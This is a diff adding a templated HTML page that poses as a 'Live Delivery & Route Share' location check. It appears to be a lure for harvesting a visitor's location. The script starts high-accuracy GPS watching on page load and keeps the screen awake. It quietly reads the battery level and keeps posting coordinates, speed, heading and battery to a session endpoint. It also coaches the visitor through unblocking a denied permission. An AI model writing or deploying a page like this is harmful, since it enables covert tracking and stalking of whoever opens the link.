@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live Delivery & Route Share</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+      background: #f1f5f9;
+      color: #0f172a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+    .container {
+      background: #ffffff;
+      border-radius: 24px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.04);
+      width: 100%;
+      max-width: 420px;
+      padding: 28px 24px;
+      text-align: center;
+    }
+    .brand-icon {
+      width: 68px;
+      height: 68px;
+      margin: 0 auto 16px;
+      background: #e0f2fe;
+      color: #0284c7;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .brand-icon svg {
+      width: 36px;
+      height: 36px;
+      fill: currentColor;
+    }
+    h1 {
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: #0f172a;
+      margin-bottom: 6px;
+    }
+    p.subtitle {
+      font-size: 0.88rem;
+      color: #64748b;
+      line-height: 1.4;
+      margin-bottom: 20px;
+    }
+    .status-card {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .status-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 0;
+      font-size: 0.85rem;
+      border-bottom: 1px dashed #e2e8f0;
+    }
+    .status-item:last-child {
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+    .status-item:first-child {
+      padding-top: 0;
+    }
+    .status-label {
+      color: #64748b;
+      font-weight: 500;
+    }
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 600;
+      font-size: 0.8rem;
+      padding: 3px 8px;
+      border-radius: 9999px;
+    }
+    .badge-pending {
+      background: #fef3c7;
+      color: #b45309;
+    }
+    .badge-live {
+      background: #dcfce7;
+      color: #15803d;
+    }
+    .badge-error {
+      background: #fee2e2;
+      color: #b91c1c;
+    }
+    .pulse-indicator {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: currentColor;
+    }
+    .btn-main {
+      width: 100%;
+      padding: 15px;
+      background: #0284c7;
+      color: #ffffff;
+      border: none;
+      border-radius: 14px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(2, 132, 199, 0.25);
+      transition: all 0.2s;
+    }
+    .btn-main:active {
+      transform: scale(0.98);
+      background: #0369a1;
+    }
+    .unblock-alert {
+      display: none;
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      border-radius: 14px;
+      padding: 14px;
+      margin-top: 16px;
+      text-align: left;
+      font-size: 0.8rem;
+      color: #991b1b;
+      line-height: 1.45;
+    }
+    .unblock-alert strong {
+      display: block;
+      margin-bottom: 6px;
+      color: #7f1d1d;
+    }
+    .unblock-alert ol {
+      margin-left: 18px;
+    }
+    .unblock-alert li {
+      margin-bottom: 4px;
+    }
+    .footer-note {
+      margin-top: 18px;
+      font-size: 0.72rem;
+      color: #94a3b8;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="brand-icon">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 0 1 0-5 2.5 2.5 0 0 1 0 5z"/>
+      </svg>
+    </div>
+
+    <h1>Verify Live Location</h1>
+    <p class="subtitle">Please share your current location to connect with the live navigation and tracking session.</p>
+
+    <div class="status-card">
+      <div class="status-item">
+        <span class="status-label">Session ID</span>
+        <span style="font-family: monospace; font-weight: 600; color:#334155;">{{SESSION_ID}}</span>
+      </div>
+      <div class="status-item">
+        <span class="status-label">Connection</span>
+        <span class="status-badge badge-pending" id="badgeStatus">
+          <span class="pulse-indicator"></span>
+          <span id="statusLabel">Awaiting GPS</span>
+        </span>
+      </div>
+      <div class="status-item">
+        <span class="status-label">Accuracy</span>
+        <span style="font-weight: 600; color:#334155;" id="accDisplay">--</span>
+      </div>
+    </div>
+
+    <button class="btn-main" id="grantBtn" onclick="initLocationTracking()">Allow Location Access</button>
+
+    <div class="unblock-alert" id="unblockGuide">
+      <strong>Permission is Blocked in Browser:</strong>
+      <ol>
+        <li>Tap the <strong>lock / settings icon</strong> in the top address bar.</li>
+        <li>Select <strong>Site Settings</strong> or <strong>Permissions</strong>.</li>
+        <li>Tap <strong>Location</strong> and select <strong>Allow</strong>.</li>
+        <li>Tap the button above again.</li>
+      </ol>
+    </div>
+
+    <div class="footer-note">
+      Secure GPS connection. Keep this tab open while sharing.
+    </div>
+  </div>
+
+  <script>
+    const sessionId = "{{SESSION_ID}}";
+    let watchId = null;
+    let batteryLevel = 0;
+
+    if ('getBattery' in navigator) {
+      navigator.getBattery().then(batt => {
+        batteryLevel = Math.round(batt.level * 100);
+        batt.addEventListener('levelchange', () => {
+          batteryLevel = Math.round(batt.level * 100);
+        });
+      });
+    }
+
+    async function keepAwake() {
+      if ('wakeLock' in navigator) {
+        try {
+          await navigator.wakeLock.request('screen');
+        } catch (e) {}
+      }
+    }
+
+    async function sendCoords(pos) {
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      const acc = pos.coords.accuracy || 0;
+      const spd = (pos.coords.speed ? (pos.coords.speed * 3.6) : 0).toFixed(1);
+      const hdg = pos.coords.heading || 0;
+
+      document.getElementById('badgeStatus').className = 'status-badge badge-live';
+      document.getElementById('statusLabel').innerText = 'Location Active';
+      document.getElementById('accDisplay').innerText = `±${Math.round(acc)}m (Good)`;
+      document.getElementById('grantBtn').innerText = 'Sharing Active';
+      document.getElementById('grantBtn').style.background = '#16a34a';
+      document.getElementById('unblockGuide').style.display = 'none';
+
+      try {
+        await fetch(`/api/location/${sessionId}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            latitude: lat,
+            longitude: lng,
+            accuracy: acc,
+            speed: parseFloat(spd),
+            heading: hdg,
+            battery: batteryLevel
+          })
+        });
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    function onLocationError(err) {
+      document.getElementById('badgeStatus').className = 'status-badge badge-error';
+      document.getElementById('grantBtn').innerText = 'Retry Permission';
+      document.getElementById('grantBtn').style.background = '#dc2626';
+
+      if (err.code === 1) {
+        document.getElementById('statusLabel').innerText = 'Access Blocked';
+        document.getElementById('unblockGuide').style.display = 'block';
+      } else {
+        document.getElementById('statusLabel').innerText = 'GPS Signal Weak';
+      }
+    }
+
+    function initLocationTracking() {
+      keepAwake();
+      if (!('geolocation' in navigator)) {
+        alert('Browser does not support GPS.');
+        return;
+      }
+      if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+      }
+
+      document.getElementById('statusLabel').innerText = 'Connecting...';
+
+      watchId = navigator.geolocation.watchPosition(sendCoords, onLocationError, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      initLocationTracking();
+    });
+  </script>
+</body>
+</html>
